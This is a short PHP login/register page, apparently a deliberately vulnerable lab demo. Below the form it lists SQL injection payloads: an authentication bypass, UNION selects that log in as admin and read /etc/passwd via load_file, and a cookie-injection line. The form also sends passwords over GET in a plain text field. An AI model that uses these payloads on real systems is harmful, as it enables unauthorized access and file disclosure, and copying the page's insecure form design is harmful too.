<?php include("header.php"); /*phpinfo();*/?>
<div class = "middlebox">
  <form action = "./index_get.php" method = "get">
    <label for = "username">Name:</label>
    <input type="text" name = "username">
    <br>
    <label for = "password">Password:</label>
    <input type="text" name = "password">
    <br>
    <div id = "buttons" class = "form-center">
      <input type="submit" name = "cmd" value = "register">
      <input type="submit" name = "cmd" value = "login">
    </div>
  </form>
  <li> Attack1:</li>
  <h> admin'# </h>
  <li> Attack2: </li>
  <h> whatever' union select 1,'admin',3#</h>
  <li> Attack3: </li>
  <h> whatever' union select 1,load_file('/etc/passwd'),3#</h>
  <li> Cookie injection: </li>
  <li>document.cookie = "username=" + escape("admin'#");</h>
</div>
  <?php

   ?>
<?php include("footer.php"); ?>
